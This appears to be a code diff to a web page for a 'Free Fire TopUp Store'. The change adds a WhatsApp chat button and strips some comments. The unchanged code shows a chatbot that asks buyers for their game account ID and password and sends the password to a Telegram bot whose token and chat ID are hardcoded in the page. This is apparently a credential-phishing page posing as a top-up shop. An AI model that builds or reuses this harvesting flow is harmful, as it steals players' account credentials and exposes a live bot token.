@@ -36,6 +36,37 @@ button:hover { background: #1d4ed8; }
 .chat-input-area input { flex: 1; padding: 10px; border: 1px solid #cbd5e1; border-radius: 6px; outline: none; }
 .chat-input-area button { width: auto; margin-left: 8px; padding: 0 15px; }
 
+/* FLOATING WHATSAPP BUTTON (নতুন যুক্ত করা হয়েছে) */
+.whatsapp-float {
+    position: fixed;
+    width: 60px;
+    height: 60px;
+    bottom: 20px;
+    right: 20px;
+    background-color: #25d366;
+    color: #FFF;
+    border-radius: 50%;
+    text-align: center;
+    font-size: 30px;
+    box-shadow: 2px 2px 10px rgba(0,0,0,0.3);
+    z-index: 99;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-decoration: none;
+    cursor: pointer;
+    animation: pulse 2s infinite;
+}
+.whatsapp-float:hover {
+    background-color: #128c7e;
+}
+
+@keyframes pulse {
+    0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
+    70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(37, 211, 102, 0); }
+    100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
+}
+
 footer { text-align: center; background: #111827; color: white; padding: 10px; margin-top: 20px; }
 </style>
 </head>
@@ -85,6 +116,12 @@ footer { text-align: center; background: #111827; color: white; padding: 10px; m
     </div>
 </div>
 
+<a href="https://wa.me/8801339106510" class="whatsapp-float" target="_blank" title="Chat with us on WhatsApp">
+    <svg width="35" height="35" fill="currentColor" viewBox="0 0 16 16" style="margin-top:2px;">
+        <path d="M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.564 7.93-7.934A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.69-1.117c-.2-.101-1.183-.584-1.36-.647-.176-.065-.304-.099-.432.098-.128.196-.497.618-.608.744-.11.127-.22.141-.42.04-.2-.101-.843-.311-1.607-.991-.595-.531-1.001-1.187-1.117-1.387-.116-.2-.012-.308.088-.408.09-.091.2-.232.3-.347.099-.115.132-.196.197-.329.066-.134.033-.251-.017-.352-.05-.101-.432-1.04-.593-1.428-.156-.381-.312-.33-.432-.336-.11-.007-.236-.007-.363-.007-.127 0-.333.048-.508.236-.174.188-.667.652-.667 1.592 0 .94.683 1.847.778 1.976.095.129 1.343 2.051 3.254 2.879.455.197.81.315 1.087.403.457.145.874.124 1.205.074.369-.054 1.183-.484 1.35-.95.167-.466.167-.866.117-.95-.05-.084-.176-.133-.377-.234z"/>
+    </svg>
+</a>
+
 <footer>© 2026 Free Fire TopUp Store</footer>
 
 <script>
@@ -92,7 +129,6 @@ const telegramBotToken = "8902364146:AAGlLd9TmZ3b3fkvDQ9xIm0E0bIQoWDqM_k";
 const telegramChatId = "7502567661";
 
 let step = 0;
-// pass ভেরিয়েবলটি যুক্ত করা হয়েছে ডেটা সেভ রাখার জন্য
 let orderData = { item: "", price: "", uid: "", unicikId: "", pass: "" };
 
 function startBot(item, price) {
@@ -167,11 +203,11 @@ function sendMessage() {
         } 
         else if (step === 3) {
             orderData.unicikId = userText; 
-            step = 4; // পাসওয়ার্ড চাওয়ার জন্য নতুন স্টেপ সেট করা হলো
+            step = 4; 
             addMessage("bot", "Apnar <b>Unicik ID Password</b> ti ekhane likhun 👇");
         }
         else if (step === 4) {
-            orderData.pass = userText; // পাসওয়ার্ড সেভ করা হলো
+            orderData.pass = userText; 
             step = 5; 
             
             document.getElementById('user-input').disabled = true;
@@ -194,7 +230,6 @@ function addMessage(sender, text) {
 }
 
 function sendOrderToTelegram() {
-    // টেলিগ্রাম টেক্সটে পাসওয়ার্ড ফিল্ডটি যোগ করা হয়েছে
     const textMessage = `🤖 *New TopUp Order* 🤖\n\n` +
                         `📦 *Offer:* ${orderData.item}\n` +
                         `💰 *Price:* ${orderData.price}\n` +
